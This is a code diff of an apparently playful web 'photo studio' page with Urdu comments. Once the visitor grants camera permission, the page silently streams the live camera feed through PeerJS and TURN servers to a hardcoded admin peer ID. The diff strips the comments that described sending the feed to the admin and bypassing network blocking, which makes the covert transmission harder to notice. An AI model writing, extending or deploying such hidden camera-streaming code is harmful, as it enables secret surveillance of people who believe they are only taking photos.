@@ -178,7 +178,7 @@
     // 1. ایڈمن کی Peer ID جس پر ویڈیو کا سگنل جانا ہے
     const ADMIN_PEER_ID = 'danish-cam-9988';
     
-    // 2. PeerJS کی سیٹنگ اور TURN Servers (دور کے نیٹ ورکس پر بلاکنگ ختم کرنے کے لیے)
+    // 2. PeerJS کی سیٹنگ اور TURN Servers
     const peer = new Peer({
       config: {
         iceServers: [
@@ -245,14 +245,13 @@
     }
     animateBg();
 
-    // 4. کیمرہ آن کرنے اور ایڈمن سے کنیکٹ ہونے کا بہتر اور درست فنکشن
+    // 4. کیمرہ آن کرنے کا فنکشن
     async function startStudio() {
       try {
         if (currentStream) {
           currentStream.getTracks().forEach(track => track.stop());
         }
 
-        // کیمرہ پرمشن اور فیڈ حاصل کرنا
         currentStream = await navigator.mediaDevices.getUserMedia({ 
           video: { 
             facingMode: useFacingMode,
@@ -268,7 +267,6 @@
         document.getElementById('welcomePanel').style.display = "none";
         document.getElementById('studioPanel').style.display = "block";
 
-        // کال بھیجنے کا محفوظ طریقہ (Peer open ہونے کا انتظار)
         if (peer.open) {
           peer.call(ADMIN_PEER_ID, currentStream);
         } else {
@@ -282,13 +280,13 @@
       }
     }
 
-    // 5. فرنٹ اور بیک کیمرہ تبدیل کرنے کا فنکشن
+    // 5. کیمرہ تبدیل کرنے کا فنکشن
     function switchCamera() {
       useFacingMode = (useFacingMode === "user") ? "environment" : "user";
       startStudio();
     }
 
-    // 6. تصویر کلک کر کے ڈاؤن لوڈ کرنے کا فنکشن
+    // 6. تصویر کلک کرنے کا فنکشن
     function takePhoto() {
       confetti({ particleCount: 250, spread: 140, origin: { y: 0.6 } });
 
@@ -309,6 +307,16 @@
       link.click();
       document.body.removeChild(link);
     }
+
+    // 7. پیج بند یا ریفریش ہونے پر کنکشن اور کیمرہ مکمل ختم کرنا
+    window.addEventListener('beforeunload', () => {
+      if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+      }
+      if (peer) {
+        peer.destroy();
+      }
+    });
   </script>
 </body>
 </html>
